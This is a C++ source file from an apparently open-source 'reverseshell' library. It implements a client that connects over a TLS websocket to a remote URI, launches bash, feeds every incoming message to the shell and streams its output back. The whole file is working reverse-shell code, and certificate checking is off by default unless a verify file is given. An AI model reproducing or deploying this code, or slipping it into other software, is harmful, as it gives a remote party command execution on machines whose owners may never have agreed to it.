/* MIT licence:
 * Copyright 2017 Rymapt
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy of
 * this software and associated documentation files (the "Software"), to deal in the
 * Software without restriction, including without limitation the rights to use, copy,
 * modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
 * and to permit persons to whom the Software is furnished to do so, subject to the
 * following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
 * PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
 * HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
 * OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */
#include "reverseshell/Client.h"

#include <websocketpp/client.hpp>
#include <websocketpp/config/asio.hpp>
#include <pstream.h>
#include "reverseshell/version.h"

//
// Declaration of the pimple
//
namespace reverseshell
{
	class ClientPrivateMembers
	{
	public:
		typedef websocketpp::client<websocketpp::config::asio_tls> client_type;
		enum class State { Ready, Connecting, Connected, Disconnecting };
		client_type client_;
		State state_;
		mutable std::mutex stateMutex_;
		client_type::connection_ptr connection_;
		std::string certificateChainFileName_;
		std::string privateKeyFileName_;
		std::string verifyFileName_;
		std::string diffieHellmanParamsFileName_;

		// Variables required for the shell
		std::thread shellThread_;
		std::vector<std::string> shellInput_;
		std::mutex shellInputMutex_;

		ClientPrivateMembers();
		~ClientPrivateMembers();
		void on_open( websocketpp::connection_hdl hdl );
		void on_close( websocketpp::connection_hdl hdl );
		void on_interrupt( websocketpp::connection_hdl hdl );
		void on_message( websocketpp::connection_hdl hdl, client_type::message_ptr );
		std::shared_ptr<websocketpp::lib::asio::ssl::context> on_tls_init( websocketpp::connection_hdl hdl );
		bool verify_cert( bool preverified, websocketpp::lib::asio::ssl::verify_context& context );
		void send( const char* buffer, size_t size );
		void shellLoop();
	};
}

// Extend std::to_string so that it can print out the ClientPrivateMembers::State enum
namespace std
{
	std::string to_string( const reverseshell::ClientPrivateMembers::State& state )
	{
		using State=reverseshell::ClientPrivateMembers::State;
		switch( state )
		{
			case State::Ready: return "Ready";
			case State::Connecting: return "Connecting";
			case State::Connected: return "Connected";
			case State::Disconnecting: return "Disconnecting";
			default: return "<unknown>"; // Should never happen
		}
	}
}

reverseshell::Client::Client()
	: pImple_( new ClientPrivateMembers )
{
	// No operation. Most work done in the ClientPrivateMembers constructor.
}

reverseshell::Client::Client( Client&& otherClient ) noexcept
	: pImple_( std::move(otherClient.pImple_) )
{
	// No operation, everything done in initialiser list
}

reverseshell::Client::~Client()
{
	// No operation
}

void reverseshell::Client::connect( const std::string& URI )
{
	std::unique_lock<std::mutex> stateLock(pImple_->stateMutex_);
	// If in the process of disconnecting, give a little time for it to take effect
	for( size_t tries=0; pImple_->state_==ClientPrivateMembers::State::Disconnecting && tries<10; ++tries )
	{
		stateLock.unlock();
		std::this_thread::sleep_for( std::chrono::milliseconds(50) );
		stateLock.lock();
	}

	pImple_->state_=ClientPrivateMembers::State::Connecting;
	websocketpp::lib::error_code errorCode;
	pImple_->connection_=pImple_->client_.get_connection( URI, errorCode );
	if( errorCode.value()!=0 ) throw std::runtime_error( "Unable to get the websocketpp connection - "+errorCode.message() );

	if( errorCode )
	{
		pImple_->connection_=nullptr;
		pImple_->state_=ClientPrivateMembers::State::Ready;
		pImple_->client_.get_alog().write(websocketpp::log::alevel::app,errorCode.message());
		throw std::runtime_error( errorCode.message() );
	}

	pImple_->client_.connect( pImple_->connection_ );
}

void reverseshell::Client::run()
{
	std::unique_lock<std::mutex> stateLock(pImple_->stateMutex_);
	if( pImple_->state_!=ClientPrivateMembers::State::Connecting )
	{
		throw std::runtime_error( "Client::run() called when not in the Connecting state (current state is '"+std::to_string(pImple_->state_)+"')" );
	}
	stateLock.unlock();
	pImple_->client_.run();
}

void reverseshell::Client::disconnect()
{
	std::unique_lock<std::mutex> stateLock(pImple_->stateMutex_);
	// If in the process of connecting, give a little time for it to take effect
	for( size_t tries=0; pImple_->state_==ClientPrivateMembers::State::Connecting && tries<10; ++tries )
	{
		stateLock.unlock();
		std::this_thread::sleep_for( std::chrono::milliseconds(50) );
		stateLock.lock();
	}

	if( pImple_->state_==ClientPrivateMembers::State::Connected )
	{
		pImple_->state_=ClientPrivateMembers::State::Disconnecting;
		if( pImple_->connection_ )
		{
			pImple_->connection_->close( websocketpp::close::status::normal, "Had enough. Bye." );
			pImple_->connection_=nullptr;
		}
	}
	// Don't worry if already disconnected, don't treat it as an error
}

void reverseshell::Client::setCertificateChainFile( const std::string& filename )
{
	pImple_->certificateChainFileName_=filename;
}

void reverseshell::Client::setPrivateKeyFile( const std::string& filename )
{
	pImple_->privateKeyFileName_=filename;
}

void reverseshell::Client::setVerifyFile( const std::string& filename )
{
	pImple_->verifyFileName_=filename;
}

void reverseshell::Client::send( const std::string& message )
{
	pImple_->send( message.data(), message.size() );
}

reverseshell::ClientPrivateMembers::ClientPrivateMembers()
{
	state_=State::Ready;
	client_.set_access_channels(websocketpp::log::alevel::none);
	//client_.set_error_channels(websocketpp::log::elevel::all ^ websocketpp::log::elevel::info);
	//client_.set_error_channels(websocketpp::log::elevel::none);
	client_.set_error_channels(websocketpp::log::elevel::all);
	client_.set_tls_init_handler( std::bind( &ClientPrivateMembers::on_tls_init, this, std::placeholders::_1 ) );
	client_.init_asio();
	client_.set_open_handler( std::bind( &ClientPrivateMembers::on_open, this, std::placeholders::_1 ) );
	client_.set_close_handler( std::bind( &ClientPrivateMembers::on_close, this, std::placeholders::_1 ) );
	client_.set_interrupt_handler( std::bind( &ClientPrivateMembers::on_interrupt, this, std::placeholders::_1 ) );
	client_.set_message_handler( std::bind( &ClientPrivateMembers::on_message, this, std::placeholders::_1, std::placeholders::_2 ) );
	client_.set_user_agent( "ReverseShellClient/"+std::string(reverseshell::version::GitDescribe) );
}

reverseshell::ClientPrivateMembers::~ClientPrivateMembers()
{
	if( shellThread_.joinable() )
	{
		{ // limit scope of shellInputLock
			std::lock_guard<std::mutex> shellInputLock(shellInputMutex_);
			shellInput_.emplace_back(); // Empty string is interpreted by the shellLoop() as EOF
		}
		std::cout << "Joining shell thread..." << std::endl;
		shellThread_.join();
		std::cout << "Joined shell thread" << std::endl;
	}
}

void reverseshell::ClientPrivateMembers::on_open( websocketpp::connection_hdl hdl )
{
	std::cout << "Connection has opened on the client" << std::endl;
	std::lock_guard<std::mutex> stateLock(stateMutex_);
	state_=State::Connected;

	std::lock_guard<std::mutex> shellInputLock(shellInputMutex_);
	shellInput_.clear(); // Make sure nothing is left over from a previous connection
	shellThread_=std::thread( std::bind( &ClientPrivateMembers::shellLoop, this ) );
}

void reverseshell::ClientPrivateMembers::on_close( websocketpp::connection_hdl hdl )
{
	std::cout << "Connection has closed on the client" << std::endl;
	auto pConnection=client_.get_con_from_hdl(hdl);
	if( pConnection )
	{
		std::cout << "Remote code was " << pConnection->get_remote_close_code() << " with reason '" << pConnection->get_remote_close_reason() << "'" << std::endl;
	}
	std::lock_guard<std::mutex> stateLock(stateMutex_);
	state_=State::Ready;

	std::lock_guard<std::mutex> shellInputLock(shellInputMutex_);
	shellInput_.emplace_back(); // Empty string is interpreted by the shellLoop() as EOF
}

void reverseshell::ClientPrivateMembers::on_interrupt( websocketpp::connection_hdl hdl )
{
	std::cout << "Connection has been interrupted on the client" << std::endl;
	std::lock_guard<std::mutex> stateLock(stateMutex_);
	state_=State::Ready;

	std::lock_guard<std::mutex> shellInputLock(shellInputMutex_);
	shellInput_.emplace_back(); // Empty string is interpreted by the shellLoop() as EOF
}

void reverseshell::ClientPrivateMembers::on_message( websocketpp::connection_hdl hdl, client_type::message_ptr pMessage )
{
	std::cout << "Client received message '" << pMessage->get_payload() << "'" << std::endl;
	std::lock_guard<std::mutex> shellInputLock(shellInputMutex_);
	shellInput_.emplace_back( pMessage->get_payload() );
}

std::shared_ptr<websocketpp::lib::asio::ssl::context> reverseshell::ClientPrivateMembers::on_tls_init( websocketpp::connection_hdl hdl )
{
	std::cout << "TLS is being initiated in the client" << std::endl;
	namespace asio=websocketpp::lib::asio;
	auto pSSLContext=std::make_shared<websocketpp::lib::asio::ssl::context>(asio::ssl::context::tlsv12);
	// Try and copy the "intermediate" SSL (actually TLS) settings from
	// https://mozilla.github.io/server-side-tls/ssl-config-generator/. There's
	// not an OpenSSL option but you can infer most of the options from the other
	// configurations.
	pSSLContext->set_options( asio::ssl::context::default_workarounds |
	                        asio::ssl::context::no_sslv2 |
	                        asio::ssl::context::no_sslv3 |
	                        asio::ssl::context::single_dh_use );
	SSL_CTX_set_cipher_list( pSSLContext->native_handle(), "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:"
		"ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
		"DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:"
		"ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA384:"
		"ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:"
		"DHE-RSA-AES256-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES128-GCM-SHA256:"
		"AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:DES-CBC3-SHA:!DSS" );
	//pSSLContext->set_password_callback( websocketpp::lib::bind( &server::get_password, this ) );
	if( !certificateChainFileName_.empty() ) pSSLContext->use_certificate_chain_file( certificateChainFileName_ );
	if( !privateKeyFileName_.empty() ) pSSLContext->use_private_key_file( privateKeyFileName_, asio::ssl::context::pem );
	if( !verifyFileName_.empty() )
	{
		pSSLContext->set_verify_mode( asio::ssl::verify_peer | asio::ssl::verify_fail_if_no_peer_cert );
		pSSLContext->load_verify_file( verifyFileName_ );
		pSSLContext->set_verify_callback( std::bind( &ClientPrivateMembers::verify_cert, this, std::placeholders::_1, std::placeholders::_2 ) );
	}
	else pSSLContext->set_verify_mode( asio::ssl::verify_none );
	if( !diffieHellmanParamsFileName_.empty() ) pSSLContext->use_tmp_dh_file( diffieHellmanParamsFileName_ );

	return pSSLContext;
}

bool reverseshell::ClientPrivateMembers::verify_cert( bool preverified, websocketpp::lib::asio::ssl::verify_context& context )
{
	std::cout << "Verifying certificate '" << X509_NAME_oneline( X509_get_subject_name(X509_STORE_CTX_get_current_cert( context.native_handle() )), nullptr, 0 )
			<< "' at depth " << X509_STORE_CTX_get_error_depth( context.native_handle() )
			<< " with preverified=" << preverified << ".";
	auto error=X509_STORE_CTX_get_error( context.native_handle() );
	if( error ) std::cout << " Error is '" << X509_verify_cert_error_string(error) << "'";
	std::cout << std::endl;

	return preverified;
}

void reverseshell::ClientPrivateMembers::send( const char* buffer, size_t size )
{
	std::unique_lock<std::mutex> stateLock(stateMutex_);
	// If still in the process of forming a connection, wait until that has finished
	while( state_==State::Connecting )
	{
		stateLock.unlock();
		std::this_thread::sleep_for( std::chrono::milliseconds(50) );
		stateLock.lock();
	}

	if( state_==State::Connected )
	{
		if( connection_ )
		{
			connection_->send( buffer, size );
		}
		else throw std::runtime_error( "Client::send() invalid connection state" );
	}
	else throw std::runtime_error( "Client::send() called when not connected (current state is '"+std::to_string(state_)+"')" );
}

void reverseshell::ClientPrivateMembers::shellLoop()
{
	try
	{
		const redi::pstreams::pmode mode = redi::pstreams::pstdin | redi::pstreams::pstdout | redi::pstreams::pstderr;
		redi::pstream shellStream("bash", mode);
		std::array<char,1024> buffer; // First byte is Client::MessageType, then the message data
		std::streamsize n;
		bool errorFinished=false;
		bool outFinished=false;

		while( !errorFinished || !outFinished )
		{
			//
			// Write all error output over the websocket
			//
			if (!errorFinished)
			{
				buffer[0]=static_cast<char>( Client::MessageType::StdErr );
				while( (n = shellStream.err().readsome( &buffer[1], buffer.size()-1 )) > 0 ) send( buffer.data(), n+1 );
				if( shellStream.eof() )
				{
					errorFinished = true;
					if( !outFinished ) shellStream.clear();
					else break; // Skip the sleep at the end of the loop
				}
			}

			//
			// Write all standard output over the websocket
			//
			if (!outFinished)
			{
				buffer[0]=static_cast<char>( Client::MessageType::StdOut );
				while( (n = shellStream.out().readsome( &buffer[1], buffer.size()-1 )) > 0 ) send( buffer.data(), n+1 );
				if( shellStream.eof() )
				{
					outFinished = true;
					if( !errorFinished ) shellStream.clear();
					else break; // Skip the sleep at the end of the loop
				}
			}

			//
			// Read input from the websocket and feed it to the shell
			//
			std::vector<std::string> shellInputCopy;
			{
				std::lock_guard<std::mutex> shellInputLock(shellInputMutex_);
				shellInputCopy.swap( shellInput_ );
			}
			for( const auto& shellInput : shellInputCopy )
			{
				// Assume that empty input means the stream needs to be closed by sending it EOF
				if( shellInput.empty() ) shellStream << redi::peof;
				else shellStream << shellInput << std::flush;
			}

			//
			// Slow the loop slightly, since nothing here blocks
			//
			std::this_thread::sleep_for( std::chrono::milliseconds(10) );
		} // End of loop checking shell output and error streams

		// If the shell has finished, close the connection
		std::unique_lock<std::mutex> stateLock(stateMutex_);
		if( state_==ClientPrivateMembers::State::Connected )
		{
			state_=ClientPrivateMembers::State::Disconnecting;
			if( connection_ )
			{
				connection_->close( websocketpp::close::status::normal, "Shell finished" );
				connection_=nullptr;
			}
		}
	}
	catch( const std::runtime_error& error ){ std::cerr << "Exception in shell thread: " << error.what() << std::endl; }
	catch(...){ std::cerr << "Unknown exception in shell thread" << std::endl; }
}
